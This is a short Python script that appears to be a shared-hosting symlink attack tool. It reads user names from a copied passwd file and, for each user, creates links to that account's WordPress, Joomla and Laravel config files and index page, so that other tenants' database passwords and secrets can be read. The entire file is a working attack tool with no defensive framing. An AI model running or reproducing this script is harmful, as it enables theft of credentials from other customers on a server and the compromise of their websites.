# -*- coding: utf-8 -*-
import os
try:
	os.mkdir("wp")
except:
	pass
try:
	os.mkdir("joomla")
except:
	pass
try:
	os.mkdir("laravel")
except:
	pass
try:
	os.mkdir("index")
except:
	pass

passwd = open("passwd.txt").read()

def sym(passwd):
	for i in passwd.splitlines():
		x = i.split(":")
		user = x[0]
		try:
			os.system("ln -s /home/"+str(user)+"/public_html/wp-config.php wp/"+str(user)+"-Wordpress.txt")
			os.system("ln -s /home/"+str(user)+"/public_html/configuration.php joomla/"+str(user)+"-Joomla.txt")
			os.system("ln -s /home/"+str(user)+"/public_html/.env laravel/"+str(user)+"-env.txt")
			os.system("ln -s /home/"+str(user)+"/public_html/index.php index/"+str(user)+"-test.txt")
		except:
			continue
	print("all progress done")

sym(passwd)
